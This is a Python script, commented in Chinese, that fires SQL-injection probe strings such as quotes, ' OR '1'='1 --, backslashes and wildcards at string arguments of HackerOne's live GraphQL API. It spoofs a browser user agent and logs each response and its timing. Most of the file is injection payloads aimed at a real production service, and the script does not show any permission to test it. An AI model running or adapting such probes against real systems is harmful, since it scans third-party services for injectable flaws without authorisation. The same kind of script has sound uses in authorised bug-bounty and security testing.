# -*- coding: utf-8 -*-
"""h1x49k: 根查询字符串参数 SQL 注入面扫描(匿名只读,payload 仅引号/闭合/反斜杠,零破坏)
点:team(handle) organization(handle) user(username) resource(url) external_program(handle)
cve_entry(cve_id) cwe_entry(cwe_id) reports(handle/state/substate/assignee/has_retests)"""
import sys, io, json, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

Q = chr(39)

def probe(name, qstr, timeout=15):
    t0 = time.time()
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': qstr}, timeout=timeout)
        dt = round(time.time() - t0, 1)
        print(f'--- {name} [{r.status_code} {dt}s] {r.text[:150]}')
    except Exception as e:
        dt = round(time.time() - t0, 1)
        print(f'--- {name} ERR {type(e).__name__} {dt}s: {e}')

def tstr(name, template, base_vals):
    for v in base_vals:
        q = template % (json.dumps(v, ensure_ascii=False),)
        probe('%s=%r' % (name, v[:14]), q)

INJ = ['ups', Q, 'ups' + Q, Q + ' OR ' + Q + '1' + Q + '=' + Q + '1 --', 'ups\\', 'ups"', '%', '*']
# 字符串参数点
tstr('team_handle', '{ team(handle: %s) { id } }', INJ)
tstr('org_handle', '{ organization(handle: %s) { id } }', INJ)
tstr('user_username', '{ user(username: %s) { id } }', INJ)
tstr('extprog_handle', '{ external_program(handle: %s) { id } }', INJ)
tstr('cve_id', '{ cve_entry(cve_id: %s) { id } }', INJ)
tstr('cwe_id', '{ cwe_entry(cwe_id: %s) { id } }', INJ)
tstr('reports_handle', '{ reports(handle: %s, limit: 1) { total_count } }', ['public', Q, 'public' + Q, Q + ' OR ' + Q + '1' + Q + '=' + Q + '1 --', 'x\\', 'x"', '*', '%'])
tstr('reports_state', '{ reports(state: %s, limit: 1) { total_count } }', ['public', Q, 'public' + Q, Q + ' OR ' + Q + '1' + Q + '=' + Q + '1 --', 'x\\', 'x"', '*', '%'])
tstr('reports_substate', '{ reports(substate: %s, limit: 1) { total_count } }', ['public', Q, 'public' + Q, Q + ' OR ' + Q + '1' + Q + '=' + Q + '1 --', 'x\\', 'x"', '*', '%'])
tstr('reports_assignee', '{ reports(assignee: %s, limit: 1) { total_count } }', ['public', Q, 'public' + Q, Q + ' OR ' + Q + '1' + Q + '=' + Q + '1 --', 'x\\', 'x"', '*', '%'])

# resource(url:) union
for v in ['https://hackerone.com/reports/2487889', Q, 'https://x.com/a' + Q + ' OR 1=1 --', 'a\\b']:
    probe('resource=%r' % v[:20], '{ resource(url: %s) { __typename } }' % json.dumps(v))
